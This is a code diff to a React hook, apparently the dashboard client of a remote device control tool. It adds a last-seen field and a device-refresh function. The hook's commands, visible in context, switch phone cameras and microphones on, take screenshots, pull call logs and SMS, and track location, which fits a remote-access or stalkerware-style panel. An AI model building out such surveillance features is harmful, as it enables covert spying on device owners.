@@ -47,8 +47,8 @@ export function useSocket(token) {
     socket.on('connect',    () => setConnected(true))
     socket.on('disconnect', () => setConnected(false))
 
-    socket.on('device:status', ({ deviceId, online }) => {
-      setDevices(p => ({ ...p, [deviceId]: { ...p[deviceId], deviceId, online } }))
+    socket.on('device:status', ({ deviceId, online, lastSeen }) => {
+      setDevices(p => ({ ...p, [deviceId]: { ...p[deviceId], deviceId, online, lastSeen: lastSeen || p[deviceId]?.lastSeen } }))
       if (!online) {
         setCameraFrames(p => { const n = { ...p }; delete n[deviceId]; return n })
       }
@@ -182,6 +182,22 @@ export function useSocket(token) {
     socketRef.current?.emit('cmd:speak:live:stop', { deviceId })
   }, [])
 
+  const refreshDevices = useCallback(() => {
+    if (!token) return
+    axios.get(`${SERVER_URL}/api/devices`, { headers: { Authorization: `Bearer ${token}` } })
+      .then(res => {
+        const devMap = {}, nameMap = {}
+        res.data.forEach(d => {
+          devMap[d.deviceId] = d
+          if (d.name)    nameMap[d.deviceId] = d.name
+          if (d.info)    setDeviceInfos(p => ({ ...p, [d.deviceId]: d.info }))
+          if (d.battery) setBatteries(p => ({ ...p, [d.deviceId]: d.battery }))
+        })
+        setDevices(devMap)
+        setDeviceNames(prev => ({ ...prev, ...nameMap }))
+      }).catch(() => {})
+  }, [token])
+
   const emit = (event, data) => socketRef.current?.emit(event, data)
 
   const cameraStartFront = useCallback((deviceId) => emit('cmd:camera:start:front', { deviceId }), [])
@@ -212,6 +228,6 @@ export function useSocket(token) {
     cameraStartFront, cameraStartBack, cameraStopFront, cameraStopBack,
     liveSpeakStart, liveSpeakStop,
     micOn, micOff, speak, takeScreenshot, getCallLogs, getSMS,
-    locationStart, locationStop, getRecentApps, renameDevice,
+    locationStart, locationStop, getRecentApps, renameDevice, refreshDevices,
   }
 }
